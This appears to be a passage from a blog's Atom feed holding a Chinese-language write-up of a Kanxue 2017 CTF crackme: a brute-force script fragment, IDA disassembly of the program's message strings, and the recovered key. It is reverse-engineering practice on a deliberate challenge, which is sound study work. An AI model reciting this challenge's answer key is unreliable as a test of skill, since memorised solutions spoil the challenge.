0:</span><br><span class="line">        print &apos;...&apos;, i</span><br><span class="line">    </span><br><span class="line">    if i &gt; 99999999999999999999:</span><br><span class="line">        break</span><br></pre></td></tr></table></figure> <h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p>结果最后跑出来是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get -success &gt;  12345679 1234567 12345678987654321</span><br></pre></td></tr></table></figure></p> <p>因为代码中处理字符存为数值是倒着的，所以key应该是97654321</p> <p>转载请注明出处：<a href="https://anhkgg.github.io/kxctf2017_writeup2">https://anhkgg.github.io/kxctf2017_writeup2</a></p> ]]></content>          <summary type="html">            &lt;p&gt;题目入口：&lt;a href=&quot;http://ctf.pediy.com/game-fight-32.htm&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ctf.pediy.com/game-fight-32.htm&lt;/a&gt;，可下载相关文件&lt;/p&gt; &lt;h1 id=&quot;0-定位算法位置&quot;&gt;&lt;a href=&quot;#0-定位算法位置&quot; class=&quot;headerlink&quot; title=&quot;0. 定位算法位置&quot;&gt;&lt;/a&gt;0. 定位算法位置&lt;/h1&gt;&lt;p&gt;由于是console程序，并且没有隐藏字符串，通过OD/IDA找到关键字符串，所在函数就是关键算法函数：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.data:00409058 aWellDone       db &amp;apos;WELL DONE!&amp;apos;,0Ah,0   ; DATA XREF: _main:loc_401257o&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data:00409064 aWrongKey___    db &amp;apos;WRONG KEY...&amp;apos;,0Ah,0 ; DATA XREF: _main+231o&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data:00409072                 align 4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.data:00409074 aKeyFormatError db &amp;apos;key format error...&amp;apos;,0Ah,0 ; DATA XREF: _main+9Ao&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;          </summary>            <category term="ctf" scheme="https://anhkgg.github.io/categories/ctf/"/>                 <category term="ctf" scheme="https://anhkgg.github.io/tags/ctf/"/>            <category term="writeup" scheme="https://anhkgg.github.io/tags/writeup/"/>            <category term="看雪" scheme="https://anhkgg.github.io/tags/%E7%9C%8B%E9%9B%AA/"/>            <category term="kanxue" scheme="https://anhkgg.github.io/tags/kanxue/"/>            <category term="bbs.pediy.com" scheme="https://anhkgg.github.io/tags/bbs-pediy-com/"/>            <category term="crackme" scheme="https://anhkgg.github.io/tags/crackme/"/>        </entry>    </feed> 